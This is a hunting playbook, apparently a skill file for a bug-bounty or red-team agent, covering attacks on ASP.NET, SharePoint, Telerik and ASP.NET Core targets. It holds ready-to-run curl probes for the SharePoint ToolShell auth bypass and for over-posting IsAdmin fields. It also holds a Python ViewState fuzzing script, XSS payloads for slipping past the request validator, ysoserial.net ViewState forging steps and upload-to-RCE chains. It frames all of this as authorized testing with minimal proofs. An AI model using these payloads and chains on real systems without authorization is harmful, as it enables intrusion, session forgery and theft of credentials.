---
name: hunt-aspnet
description: Hunt ASP.NET-specific surface — ViewState deserialization (signed-only vs encrypted; RCE only after machineKey recovery or a proven gadget, one OOB callback), machineKey disclosure, on-prem SharePoint ToolShell (Referer SignOut.aspx into ToolPane.aspx; CVE-2025-53770 family; not SharePoint Online), request-validator bypass, trace.axd/elmah.axd disclosure, load-balanced ViewState cross-node failures, SafeControl type checks, customErrors mode=Off stack-trace leaks, classic Webforms .aspx/.asmx/.svc plus ASP.NET Core key-ring, over-posting, and DataProtection psychic-MAC (CVE-2026-40372, 10.0.0–10.0.6). Use on IIS, Kestrel, SharePoint, Telerik, DNN, Blazor, or __VIEWSTATE.
sources: github, authorized-engagement
report_count: 1
---

## Crown Jewel Targets

ASP.NET ViewState and on-prem SharePoint ToolShell matter when they reach code execution or leak live secrets. A signed-only ViewState, two different ViewState error strings, or a request-validator quirk is a lead. Report only the tier you proved.

**Highest-value targets:**

- **On-prem SharePoint Server** (2010/2013/2016/2019/Subscription Edition — not SharePoint Online). ToolShell: `POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit` (also `/_layouts/16/` and a trailing slash) with `Referer` of `/_layouts/SignOut.aspx`, `/_layouts/14/SignOut.aspx`, or `/_layouts/15/SignOut.aspx`. That Referer is the auth bypass (CVE-2025-49706 / CVE-2025-53771). Unsafe WebPart deserialization is CVE-2025-49704 / CVE-2025-53770. Later ViewState forgery needs the stolen `machineKey`. An anonymous 200 and an empty `__VIEWSTATEENCRYPTED` are not RCE. Patches exist for 2016/2019/SE; 2010/2013 were identified as affected and are out of support.
- **Telerik UI for ASP.NET AJAX** — `Telerik.Web.UI.WebResource.axd` is a documented RCE sink when keys leak (CVE-2017-11317, CVE-2017-11357, CVE-2019-18935)
- **Classic ASP.NET Webforms enterprise apps** — banking portals, dealer portals, HR systems left on .NET Framework 4.x
- **WCF services** (`*.svc?WSDL`) — often forgotten admin endpoints with looser auth than the main app
- **Sitecore CMS** — ViewState + Sitecore-specific deserialization chains (CVE-2021-42237)
- **DotNetNuke (DNN)** — historic ViewState RCE chains
- **Umbraco CMS** — ViewState + custom deserialization sinks

**Where to look, in yield order:** Webforms `__VIEWSTATE` and on-prem SharePoint when a key or a ToolShell gadget is actually proven; forgotten `.svc` / `.asmx`; Telerik `WebResource.axd` only inside the vulnerable version range; ASP.NET Core / MVC / Razor / Blazor have no ViewState — hunt over-posting, data-protection key-ring disclosure, and authz gaps. Do not skip a stack because it is common.

---

## Attack Surface Signals

**Response headers indicating ASP.NET:**
```
X-AspNet-Version: 4.0.30319          (classic — disclosure on its own)
X-Powered-By: ASP.NET
X-AspNetMvc-Version: 5.2
Server: Microsoft-IIS/10.0
Set-Cookie: ASP.NET_SessionId=...
Set-Cookie: .ASPXAUTH=...            (Forms auth cookie)
Set-Cookie: .ASPXFORMSAUTH=...
Set-Cookie: ASP.NET_SessionId=...; SameSite=None  (suggests cross-origin embedding)
```

**Body signals (in form HTML):**
```
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="..." />
<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="..." />
<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
                                        ↑ EMPTY = signed-only, not encrypted = exploitable if key leaks
<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="..." />
<input type="hidden" name="__REQUESTDIGEST" id="__REQUESTDIGEST" value="0x...,...">
                                        ↑ SharePoint CSRF token; if anon-issued, see hunt-sharepoint
```

**URL patterns to probe:**
```
/trace.axd                            (per-app trace viewer; sometimes anon-accessible)
/elmah.axd                            (ELMAH error log viewer)
/elmah.axd/?id=...                    (ELMAH error detail — disclosure, not RCE)
/*.svc                                (WCF services)
/*.svc?wsdl                           (WCF WSDL)
/*.svc/mex                            (Metadata Exchange)
/*.asmx                               (legacy SOAP)
/*.asmx?WSDL                          (legacy SOAP description)
/*.asmx?disco                         (legacy discovery)
/Telerik.Web.UI.WebResource.axd       (Telerik AJAX components)
/ChartImg.axd                         (DataVisualization controls; historic deserialization)
/ScriptResource.axd                   (script resource handler; sometimes leaks paths)
/WebResource.axd                      (web resource handler)
/_vti_bin/*                           (SharePoint Web Service Forwarder)
/api/                                 (Web API 2.x is ASP.NET on classic framework)
/signin                               (often FedAuth / WS-Federation)
```

**Tech-stack signals:**
- `Server: Microsoft-IIS/10.0` (or `/8.5`, `/7.5`) — Windows + IIS; `Server: Kestrel` (or no Server header behind a reverse proxy) — .NET Core/5-8+
- `X-AspNet-Version` header — classic .NET Framework (4.x); .NET Core/5+ does NOT emit this
- Cookies with `ASP.NET_SessionId`, `.ASPXAUTH`, `FedAuth` — Forms or claims auth; `.AspNetCore.*` (e.g. `.AspNetCore.Antiforgery`, `.AspNetCore.Identity.Application`) — modern ASP.NET Core
- `__VIEWSTATE` in form bodies — Webforms (NOT MVC, NOT Razor Pages, NOT Blazor)
- Blazor Server signals — `_blazor` SignalR negotiate endpoint, `blazor.server.js`; Blazor WASM — `_framework/blazor.webassembly.js`, `.dll`/`.wasm` under `_framework/`
- `MicrosoftSharePointTeamServices` header (sometimes stripped by ELB but leaks in `start.aspx` body) — SharePoint

**Decision — which ASP.NET playbook applies:**
- `__VIEWSTATE` present → Webforms → full ViewState/machineKey path below (highest RCE yield).
- `.AspNetCore.*` cookies / `Kestrel` / `_framework/` → .NET Core/Blazor → **no ViewState**. Run the Core playbook below, then generic `hunt-*`.
- MVC/Razor without `__VIEWSTATE` → Core playbook (over-posting, `[Authorize]` gaps, `@Html.Raw`).

### ASP.NET Core / MVC / Blazor (no ViewState)

Over-posting is mass assignment on the binder. Send one extra property the form never shows; re-read.

```bash
curl -s -X POST "https://$TARGET/Account/Register" -d "Email=a@$TARGET&Password=Test!234&IsAdmin=true&Role=Administrator"
curl -s -X PATCH "https://$TARGET/api/profile" -H "Cookie: $A" -H 'Content-Type: application/json' \
  -d '{"displayName":"x","isAdmin":true,"role":"Admin"}'
```

Key-ring disclosure (`hunt-source-leak` / `hunt-lfi`): `key-*.xml` under `~/App_Data/keys/`, `/root/.aspnet/DataProtection-Keys/`, `%LOCALAPPDATA%/ASP.NET/DataProtection-Keys/`. One file with a `<masterKey>` is the primitive; prove it by forging **one** `.AspNetCore.Identity.Application` (or antiforgery) cookie that performs an authenticated action. Do not dump the ring.

CVE-2026-40372 (`Microsoft.AspNetCore.DataProtection` **10.0.0–10.0.6**): defective MAC accepted payloads whose HMAC bytes were all-zero (psychic-MAC class). Primary hit: Linux/macOS when the 10.0.6 **NuGet** binary is the one loaded; Windows shared-framework copies of the same version are often not this bug; 8.x/9.x were not affected. Probe **once** in that shape against a captured `.AspNetCore.*` cookie. Proof: authenticated unique marker (`/manage` email). `401` = not this CVE. Do **not** run a padding-oracle byte loop (thousands of requests = brute + noise). Advisory: GHSA-9mv3-2cwr-p262.

Minimal APIs / Blazor: unauthenticated MapGroup without `.RequireAuthorization()`; `_blazor` negotiate. Circuit/cookie reuse is `hunt-session`.

---

## Step-by-Step Hunting Methodology

1. **Fingerprint the framework version.** Trigger any 500 error (stale ViewState POST is a reliable way) and look for `Version Information: Microsoft .NET Framework Version:X.X.XXXXX; ASP.NET Version:X.X.XXXX.X` in the error body. This banner discloses both the runtime and ASP.NET-version-specific patch level. .NET 4.0.30319 + ASP.NET 4.8.x is the most common modern combination.

2. **Locate every form with `__VIEWSTATE`.** Spider the target and grep for `name="__VIEWSTATE"`. Each is a candidate sink for deserialization attacks if MAC / encryption is bypassable.

3. **Check `__VIEWSTATEENCRYPTED` value.** Empty (`value=""`) means ViewState is signed-only via `<machineKey>` but NOT encrypted. Recovery of the validation key → arbitrary deserialization. Non-empty (`value="something"`) means ViewState is BOTH signed and encrypted; both keys needed to forge.

4. **Classify ViewState error strings (fingerprint only).** POST a few shapes (garbage, a bit-flipped real value, a short non-base64 string, a `/wEP` prefix). `"Validation of viewstate MAC failed"` means the MAC check ran and failed. `"The state information is invalid for this page"` is a different exception (formatter or page mismatch). On current .NET Framework, `ObjectStateFormatter` verifies the MAC **before** it walks the object graph. A different error string is not a pre-MAC gadget and not RCE. Do not report it. RCE requires a recovered `validationKey` (and `decryptionKey` when ViewState is encrypted) plus one OOB callback, or a separate proven gadget such as ToolShell.

5. **Look for load-balanced cross-node ViewState MAC failures.** If POST gets a 500 with `"Validation of viewstate MAC failed. If this application is hosted by a Web Farm or cluster, ensure that <machineKey> configuration specifies the same validationKey..."`, the farm has multiple WFEs WITHOUT machineKey sync, or without sticky-session affinity. Operationally this breaks legit users; security-wise it confirms farm topology.

6. **Probe `trace.axd` and `elmah.axd`.** Severity follows the body. Live cookies, `Authorization` headers, or a connection string are Critical. A stack trace with no secret is Low. A 200 that is only UI chrome, with no foreign request, is not a finding. Stock `Request.IsLocal` ignores `X-Forwarded-For` unless a proxy rewrites the remote address — a 403 that stays 403 is not a bypass.

7. **Enumerate WCF services (`.svc`).** For each, fetch `?wsdl` and `?mex` (metadata exchange). MEX endpoints sometimes return full service contracts including admin operations.

8. **Test request-validator bypass.** ASP.NET's request validator blocks `<` in query strings by default. Bypass categories that may still get through:
   - HTML-entity-encoded payloads (`&lt;script&gt;` — but these don't execute)
   - Encoded inside JSON / XML POST bodies (different content-type ≠ same validator)
   - In path segments (not query) — validator scope depends on framework version
   - In Cookie / Referer headers (varies)
   - Inside `<%@ ... %>` ASP directives if reached via WebDAV PUT (rare)

9. **Check `customErrors` mode.** If 500s expose full stack traces, framework versions, file paths, internal method names → `customErrors mode="Off"` is set. Should be `RemoteOnly` for production.

10. **Look for Telerik components.** `Telerik.Web.UI.WebResource.axd?type=rau` is the historic upload-to-RCE chain (CVE-2017-11317). The `dialogParametersHolder` parameter chain (CVE-2019-18935) requires the encryption key but is otherwise RCE.

11. **SharePoint** — run the ToolShell Referer probe below, then `hunt-sharepoint`. Anonymous FormDigest or an empty `__VIEWSTATEENCRYPTED` is not the exploit.

12. **SafeControl type check (SharePoint / DNN equivalents).** `Picker.aspx?PickerDialogType=` can return different errors for "type exists but is not a SafeControl" vs "type does not exist." Send one request each for a handful of **documented** CVE-2019-0604-family type names. Do not sweep a generated namespace. A type that instantiates is a lead; the finding is the deserialization you actually get (`hunt-sharepoint`).

---

## Payload & Detection Patterns

**Stack-trace fingerprint (trigger via stale ViewState POST):**
```bash
curl -sk -X POST "https://target.example/page.aspx" \
  --data "__VIEWSTATE=AAAA&__VIEWSTATEGENERATOR=AAAA"
# Inspect body for:
#  - "Validation of viewstate MAC failed" → MAC ran and failed (not a bypass)
#  - "The state information is invalid for this page" → different exception; still not RCE
#  - "Version Information: Microsoft .NET Framework Version:X.X.XXXXX" → patch level
#  - "Microsoft.SharePoint.Client.ServerStub..." → SharePoint farm
```

**ToolShell auth-bypass probe (on-prem only — do not post a WebPart, do not write an aspx):**
```bash
# Body must gain an edit/authenticated marker. SharePoint Online is not this CVE.
# Try Referer /_layouts/SignOut.aspx, /_layouts/14/SignOut.aspx, and /_layouts/15/SignOut.aspx.
# Also /_layouts/16/ToolPane.aspx and a trailing slash on the path (patch-bypass shape).
curl -sk -o /tmp/sp-off -w "%{http_code} %{size_download}\n" \
  -X POST "https://$TARGET/_layouts/15/ToolPane.aspx?DisplayMode=Edit"
curl -sk -o /tmp/sp-on -w "%{http_code} %{size_download}\n" \
  -X POST "https://$TARGET/_layouts/15/ToolPane.aspx?DisplayMode=Edit" \
  -H "Referer: https://$TARGET/_layouts/SignOut.aspx"
diff -q /tmp/sp-off /tmp/sp-on || echo "DIFF — confirm an auth-only marker, then stop"
```
RCE is a second claim: one OOB callback after a `machineKey` is already known, or from a single gadget the engagement allows. Then stop.

**ViewState error-string fingerprint (Python — not a finding by itself):**
```python
import requests, re
S = requests.Session(); S.verify = False
# Get fresh form
r = S.get("https://target.example/path/page.aspx")
real_vs = re.search(r'__VIEWSTATE" id="__VIEWSTATE" value="([^"]+)', r.text).group(1)
real_vsg = re.search(r'__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="([^"]+)', r.text).group(1)

# Test 7 payload shapes
for label, vs in [
    ("trivial",      "AAAA"),
    ("real",         real_vs),
    ("flipped-bit",  real_vs[:50] + "X" + real_vs[51:]),
    ("oversize",     "A" * 4096),  # do not grow this; it is not a DoS test
    ("base64",       "VGVzdE1hcmtlcjY3OFhZWg=="),
    ("xml-shaped",   "<xss/>"),
    ("losformatter", "/wEPDwUKMTcxNzgyOTQwMmRkkz9p4lzA" + "A"*50),
]:
    r = S.post("https://target.example/path/page.aspx",
               data={"__VIEWSTATE": vs, "__VIEWSTATEGENERATOR": real_vsg})
    title = re.search(r'<title>([^<]+)</title>', r.text)
    title = title.group(1)[:100] if title else "—"
    print(f"  [{label:14s}] {r.status_code}  {title}")
```

**`trace.axd` anonymous check:**
```bash
curl -sk "https://target.example/trace.axd" | head -c 400
# Read the body. Tokens or foreign request headers = the finding.
# A 403 that stays 403 with X-Forwarded-For: 127.0.0.1 is not a bypass
# (Request.IsLocal ignores that header unless a proxy rewrites the client IP).
```

**WCF service enumeration:**
```bash
# Find all .svc files
curl -sk "https://target.example/" -o body.html
grep -oE '/[a-zA-Z0-9/_-]+\.svc' body.html | sort -u
# For each found:
curl -sk "https://target.example/Service.svc?wsdl" | xmllint --format - | head -60
```

**Request-validator bypass categories** (the validator fires on `<x` patterns in querystring + urlencoded form body; it is NOT universal):
```
# Default: <script>alert(1)</script> in ?q= → "A potentially dangerous Request.QueryString value was detected"
# Note: %3cscript%3e decodes to <script and is STILL caught — URL-encoding alone does not bypass.
# Bypasses that reach a sink the validator never inspects:
?q=javascript:alert(1)              (no "<" at all — attribute/href sink XSS, passes validator)
?q=%uff1cscript%uff1e               (fullwidth/unicode that a downstream normaliser folds to "<")
Cookie: foo=<script>...             (cookie values not validated by default)
Referer / User-Agent: <script>...   (request headers not validated)
Content-Type: application/json body (JSON/XML bodies bypass; validator only sees urlencoded form fields)
multipart/form-data filename="<svg onload=...>"  (multipart field metadata not validated)
# Route/path segment (not ?query): scope depends on framework version — test both.
# requestValidationMode="2.0" in web.config reverts to the weaker legacy validator — test for it.
```
Validation: a bypass is only XSS if the value reaches an HTML/JS sink and **executes** in a victim context — confirm with a unique marker rendered unescaped, not just "the validator let it through."

**Telerik exploit gate (CVE-2019-18935 — requires encryption keys):**
```bash
# Fingerprint Telerik
curl -sk "https://target.example/Telerik.Web.UI.WebResource.axd?type=rau" -X POST
# If response is RadAsyncUploadHandler-style → Telerik present; try keys
# Public exploits require leaked machineKey AND telerikEncryptionKey
```

---

## Common Root Causes

1. **`viewStateEncryption="Auto"` defaults to signed-only on pages without sensitive ViewState data.** Many SharePoint pages are configured this way. When `__VIEWSTATEENCRYPTED` is empty, ViewState is signed-only — recovery of `validationKey` alone enables forgery.

2. **`<machineKey>` AutoGenerate in a Web Farm.** Each WFE generates a different key on first boot; ViewState issued by one WFE fails MAC validation on another. Operationally produces 500s; security-wise broadcasts the topology (the error message names the cluster).

3. **`<customErrors mode="Off">` left from development.** Stack traces with full method names, file paths, version banners exposed to anonymous internet users.

4. **`trace.axd` / `elmah.axd` left enabled in production.** Often forgotten in `<system.web><trace enabled="true">` blocks.

5. **Forgotten WCF `.svc` admin endpoints.** Built for internal admin tooling, never disabled when the main app went to internet exposure.

6. **Two formatters, one MAC.** `LosFormatter` and `ObjectStateFormatter` throw different messages. The MAC is still checked before the object graph is walked. Do not treat the message split as a bypass.

7. **Request validator only applies to URL-encoded body and querystring.** Headers, cookies, XML/JSON bodies, and multipart fields are NOT validated by default. Developers assume validator is universal; it is not.

8. **`<machineKey>` leaked.** Recovery sources to check, in order of yield: web.config disclosure (LFI / path traversal / backup files `web.config.bak`, `.old`, `~`, `web_config.txt`), `elmah.axd`/`trace.axd` dumping config, source leak / GitHub (`machineKey validationKey=` dorks), decompiled DLLs that hardcode keys (Telerik/DNN historic), and **hardcoded/sample keys from vendor docs or tutorials copy-pasted into prod** (search the leaked key against known public key lists). Combine with `hunt-source-leak` + `hunt-lfi`.

9. **`SafeControls` web.config entries trusted to gate deserialization.** SharePoint's `<SafeControl>` list determines which classes Picker.aspx can instantiate. Bypasses exist when the inheritance check is the only gate (CVE-2019-0604 family).

---

## Bypass Techniques

| Defense | Bypass |
|---|---|
| `__VIEWSTATEENCRYPTED` non-empty (encrypted) | Recover both decryption + validation keys from any source-code leak / config-disclosure / VS forge primitive; without keys, deserialization cannot be triggered |
| Request validator blocks `<` in querystring | Move payload to Cookie / Referer / JSON body / multipart filename — validator doesn't reach those contexts in classic ASP.NET |
| `EnableViewStateMac="true"` enforced | Recover `validationKey` (and `decryptionKey` if encrypted) from a leak, then one `ysoserial.net -p ViewState` payload whose `-c` is a single OOB callback (`--generator` = `__VIEWSTATEGENERATOR`, `--validationalg` / `--decryptionalg` from the leaked config). No key = no forge. One callback, then stop. Do not write an aspx into the site |
| `trace.axd` localhost-only | Only when the app rewrites the client IP from `X-Forwarded-For` or `Forwarded`. Stock `Request.IsLocal` does not. Proof is a 200 body that contains trace data |
| WCF `.svc` 401 on anonymous | Try `?wsdl` and `?mex` first; metadata is sometimes anonymously enumerable even when service ops require auth |
| Telerik upload patched | Check the Telerik version: anything pre-2017Q1 (build 2017.1.118 or earlier) is the original RAU RCE. Check 2017Q3 - 2019Q3 for CVE-2019-18935 |
| `SafeControl` whitelist enforced | On patched SharePoint the inheritance check is the gate. A bypass is a documented SafeControl subclass that actually deserializes — a handful of known type names, one request each, not a namespace sweep |
| `customErrors mode="On"` (no stack traces) | Force a different error path: invalid Content-Length, malformed ViewState that triggers a parser-level exception below the customErrors handler |

---

## Gate 0 Validation

Before writing the report, confirm:

1. **What can the attacker DO right now with the disclosed information?**
   - `trace.axd` 200 with full request dump → **Critical** (PII / session cookies / Authorization headers exposed)
   - `elmah.axd` 200 with error log → **High** (stack traces + internal paths + sometimes credentials)
   - `__VIEWSTATEENCRYPTED` empty + recovered machineKey + **one OOB callback** from the forged payload → **Critical**
   - `__VIEWSTATEENCRYPTED` empty without a key, or a key you never used → **not RCE** (Low/Medium mode disclosure at most)
   - DataProtection `key-*.xml` readable + one forged Core cookie that acts as B → **Critical** (session forge). XML without a working cookie is disclosure only
   - CVE-2026-40372: all-zero-MAC cookie **accepted** as B → **Critical**. Rejected cookie is not the CVE
   - Stack traces in 500s → **Low** unless they include credentials / connection strings

2. **Have you reproduced the full chain to attacker-attainable impact, or only the primitive?**
   - Cross-reference `triage-validation` Pre-Severity Gate. "Primitive confirmed" is not Critical until the chain ends in impact.

3. **Can a triager reproduce in <10 min from your report?**
   - Each step copy-pasteable curl / Python.
   - For RCE chains: link the public exploit tool (ysoserial.net, viewgen, telerik-revda) and the specific gadget chain.

---

## Real Impact Examples

### Scenario A — ToolShell: auth bypass proven, RCE not implied

`POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit` with `Referer: /_layouts/SignOut.aspx` returns the edit surface; the same POST without that Referer does not. That body-diff is the auth-bypass primitive (CVE-2025-49706 / CVE-2025-53771 class) on **on-prem** SharePoint. SharePoint Online is not this bug. Do not post a WebPart gadget and do not write `spinstall0.aspx` (or any other file) under layouts. RCE is a separate claim and only after one OOB callback. An empty `__VIEWSTATEENCRYPTED`, an anonymous `__REQUESTDIGEST`, or two different ViewState error strings do not make the chain reachable without a key.

### Scenario B — Telerik RadAsyncUploadHandler exposed on legacy bank portal

`/Telerik.Web.UI.WebResource.axd?type=rau` returns the Telerik upload handler. Telerik version (visible in JS bundle metadata) is 2016.3.1027. CVE-2017-11317 applies — keys are baked into the public Telerik DLL of that version. Upload → write `aspx` to `/app_data/` → request → RCE. Reported severity: **Critical**.

### Scenario C — trace.axd + elmah.axd both exposed on enterprise HR portal

`trace.axd` 200 returns 50 most recent requests, including `Authorization: Bearer eyJ...` headers on API requests. `elmah.axd` 200 returns full error log with database connection-string in one of the exceptions. Reported severity: **Critical** (credentials in plaintext to anonymous internet).

---

## Related Skills & Chains

- **`hunt-rce`** — ViewState RCE is: recovered `validationKey` (and decryption key if encrypted) + one ysoserial.net ViewState payload that produces an OOB callback, then stop. Signed-only ViewState without the key is not RCE. The callback command runs as the `w3wp.exe` app-pool identity; say that only after you saw the callback.
- **`hunt-sharepoint`** — SharePoint farms inherit every ASP.NET anti-pattern plus their own surface. Chain primitive: ASP.NET fingerprint reveals SharePoint (X-SharePoint headers + `/_layouts/` reachable) → pivot to `hunt-sharepoint` for SP-specific RCE paths (ToolShell, SafeControl reflection) before generic ViewState attack.
- **`hunt-ntlm-info`** — IIS sites that advertise NTLM/Negotiate anonymously leak AD topology. Chain primitive: ASP.NET app behind IIS with `WWW-Authenticate: NTLM` → `hunt-ntlm-info` Type-2 challenge capture → internal forest name → cross-reference Entra tenant via `m365-entra-attack` discovery.
- **`hunt-file-upload`** — Telerik RadAsyncUpload, Kentico, Umbraco, and DotNetNuke all have historical upload-handler RCE. Chain primitive: ASP.NET CMS fingerprinted → `hunt-file-upload` bypass matrix against the CMS upload handler → `.aspx` written into web-accessible path → request → RCE under app-pool identity.
- **`triage-validation`** — `trace.axd`/`elmah.axd` disclosure is only Critical when it actually leaks live credentials/tokens; pure stack traces are usually Low. Chain primitive: pull every reported finding through `triage-validation` 7-Question Gate before submission — distinguish "verbose error" (informational) from "live bearer token in error log" (Critical) before writing the report (`redteam-report-template`).

## Before you report — dedup gate

Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:

```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```

`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
